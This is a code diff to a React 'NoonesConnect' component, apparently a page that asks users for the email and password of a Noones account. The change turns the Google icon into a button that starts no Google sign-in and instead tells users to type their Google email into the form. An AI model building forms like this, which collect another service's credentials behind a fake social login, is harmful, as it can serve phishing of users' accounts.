@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useRef, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { supabase } from '../../lib/supabase';
 import { useAuth } from '../../contexts/AuthContext';
@@ -11,13 +11,20 @@ export default function NoonesConnect() {
   const [showLanguageDropdown, setShowLanguageDropdown] = useState(false);
   const [loading, setLoading] = useState(false);
   const [errorMessage, setErrorMessage] = useState('');
+  const [googleMessage, setGoogleMessage] = useState('');
   const [credentials, setCredentials] = useState({
     email: '',
     password: '',
   });
+  const emailInputRef = useRef<HTMLInputElement | null>(null);
 
   const handleFieldChange = (field: string) => (event: React.ChangeEvent<HTMLInputElement>) => {
     setCredentials((current) => ({ ...current, [field]: event.target.value }));
+  };
+
+  const handleSelectGoogleAccount = () => {
+    setGoogleMessage('Please enter your Google email in the email field above.');
+    emailInputRef.current?.focus();
   };
 
   const handleSubmit = async (event: React.FormEvent) => {
@@ -82,7 +89,11 @@ export default function NoonesConnect() {
 
           {/* Social Icons */}
           <div className="flex gap-6 mb-4">
-            <button className="w-10 h-10 flex items-center justify-center">
+            <button
+              type="button"
+              onClick={handleSelectGoogleAccount}
+              className="w-10 h-10 flex items-center justify-center rounded-full bg-white/10 hover:bg-white/20 transition"
+            >
               <img src="/logos/google-icon-logo-svgrepo-com.svg" alt="Google" className="w-9 h-9" />
             </button>
             <button className="w-10 h-10 flex items-center justify-center">
@@ -92,11 +103,15 @@ export default function NoonesConnect() {
               <img src="/logos/telegram.svg" alt="Telegram" className="w-9 h-9" />
             </button>
           </div>
+          {googleMessage && (
+            <p className="text-sm text-slate-400 mb-3">{googleMessage}</p>
+          )}
 
           <form onSubmit={handleSubmit} className="w-full space-y-3">
             <div className="space-y-2">
               <label className={`block text-[14px] font-bold ${isDarkMode ? 'text-[#8F92A3]' : 'text-[#666A78]'}`}>Email/Phone number</label>
               <input
+                ref={emailInputRef}
                 type="text"
                 value={credentials.email}
                 onChange={handleFieldChange('email')}
